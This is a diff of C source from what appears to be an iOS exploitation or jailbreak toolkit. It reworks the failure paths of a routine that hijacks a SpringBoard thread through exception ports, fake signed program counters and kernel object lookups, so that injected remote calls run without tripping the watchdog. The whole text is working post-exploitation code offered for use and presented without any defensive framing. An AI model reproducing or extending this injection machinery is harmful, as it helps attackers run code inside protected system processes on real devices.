@@ -989,6 +989,22 @@ void abandon_remote_call(void) {
     pthread_mutex_unlock(&g_universal_ipc_mutex);
 }
 
+// After creator reply parks the hijacked thread at FAKE_PC 0x101, any fail
+// path MUST restore original state before tearing local ports down. Calling
+// abandon alone leaves SpringBoard (often main) stuck at 0x101 → WATCHDOG.
+static void fail_after_creator_park(RemoteCallInitFailure why, int targetPid)
+{
+    remote_call_note_init_failure(why, targetPid);
+    if (g_RC_trojanThreadAddr && g_RC_firstExceptionPort) {
+        if (!restore_trojan_thread(&g_RC_originalState)) {
+            printf("[%s:%d] restore after FAKE_PC park failed — SB may WATCHDOG\n",
+                   __FUNCTION__, __LINE__);
+        }
+    }
+    // abandon_remote_call takes the IPC mutex; init_remote_call does not hold it here.
+    abandon_remote_call();
+}
+
 void abandon_remote_call_internal(void) {
     if (g_RC_vphoneBridge) {
         g_RC_vphoneBridge = false;
@@ -1667,31 +1683,21 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
     reply_with_state(&exc, &newState);
 
-    // Fl0rk (RemoteCallSession init @ 0x100e660dc..0x100e660f4): after replying
-    // FAKE_PC=0x101 / FAKE_LR=0x201, ALWAYS wait_exception(~1500ms) for that trap
-    // before any further remote call. Skipping this lets SpringBoard RET to raw
-    // 0x201 → SIGBUS (seen as consecutiveCrashCount SB IPS).
+    // Fl0rk @ 0x100e660ec: wait_exception(~1500) AFTER creator reply — sync only.
+    // Do NOT re-sign FAKE_PC 0x101 / drain (old e2ef173). That left SB main
+    // durable-parked at 0x101 → WATCHDOG if bootstrap/restore slipped.
+    // Reply same trapped state (PC still 0x101) → immediate re-fault; next
+    // do_remote_call_temp("getpid") consumes it (Cyanide/Fl0rk shape).
     {
         ExceptionMessage creatorExc;
         int creatorWaitMS = 1500;
         if (!wait_exception(firstExceptionPort, &creatorExc, creatorWaitMS, false)) {
-            printf("[%s:%d] FAKE_PC_TROJAN_CREATOR trap not received within %dms — SB would RET to 0x201\n",
+            printf("[%s:%d] FAKE_PC_TROJAN_CREATOR trap not received within %dms\n",
                    __FUNCTION__, __LINE__, creatorWaitMS);
-            remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
-            abandon_remote_call();
+            fail_after_creator_park(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
             return -1;
         }
-        // Park thread again at the same fake PC/LR so subsequent
-        // do_remote_call_temp can pick it up from a known trap.
-        sign_state(g_RC_trojanThreadAddr, &creatorExc.threadState,
-                   FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
         reply_with_state(&creatorExc, &creatorExc.threadState);
-        // One more short drain — Fl0rk also loops wait after creator reply.
-        while (wait_exception(firstExceptionPort, &creatorExc, 100, false)) {
-            sign_state(g_RC_trojanThreadAddr, &creatorExc.threadState,
-                       FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
-            reply_with_state(&creatorExc, &creatorExc.threadState);
-        }
     }
 
     if (g_RC_originalThreadOnly) {
@@ -1714,8 +1720,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!g_RC_success || bootstrapPid == 0) {
         printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
                __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
         return -1;
     }
 
@@ -1723,8 +1728,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!g_RC_success || createResult != 0) {
         printf("[%s:%d] pthread_create_suspended_np remote call failed result=%llu\n",
                __FUNCTION__, __LINE__, createResult);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
         return -1;
     }
 
@@ -1734,8 +1738,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!pthreadAddr) {
         printf("[%s:%d] pthread_create_suspended_np did not write a pthread pointer\n",
                __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
         return -1;
     }
     uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
@@ -1743,16 +1746,14 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!g_RC_success || !callThreadPort) {
         printf("[%s:%d] pthread_mach_thread_np remote call failed\n",
                __FUNCTION__, __LINE__);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
         return -1;
     }
     g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
     if (!is_kaddr_valid(g_RC_callThreadAddr)) {
         printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
                __FUNCTION__, __LINE__, callThreadPort, g_RC_callThreadAddr);
-        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
-        abandon_remote_call();
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
         return -1;
     }
 
@@ -1769,7 +1770,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
             if(useMigFilterBypass)
                 mig_bypass_pause();
-            destroy_remote_call();
+            // Original still parked at FAKE_PC — restore before tear-down.
+            fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
             return -1;
         }
     }
@@ -1781,13 +1783,22 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
 
     uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
     if (ret != 0) {
-        printf("[%s:%d] Couldn't resume new thread, falling back to original\n", __FUNCTION__, __LINE__);
-        g_RC_creatingExtraThread = false;
+        // Do NOT fall back to originalThreadOnly — for SpringBoard that parks
+        // main at FAKE_PC between calls and trips backboardd WATCHDOG.
+        printf("[%s:%d] Couldn't resume new thread — abort (no originalThreadOnly fallback)\n",
+               __FUNCTION__, __LINE__);
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
+        return -1;
     }
 
-    if (g_RC_creatingExtraThread) {
-        RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
-        restore_trojan_thread(&g_RC_originalState);
+    RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
+    if (!restore_trojan_thread(&g_RC_originalState)) {
+        printf("[%s:%d] restore original after pthread bootstrap failed\n",
+               __FUNCTION__, __LINE__);
+        // Extra thread is live; still tear down cleanly via destroy path later.
+        // Original may be stuck — best-effort already tried.
+        fail_after_creator_park(RemoteCallInitFailureOther, targetPid);
+        return -1;
     }
     RC_DEBUG("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);
 
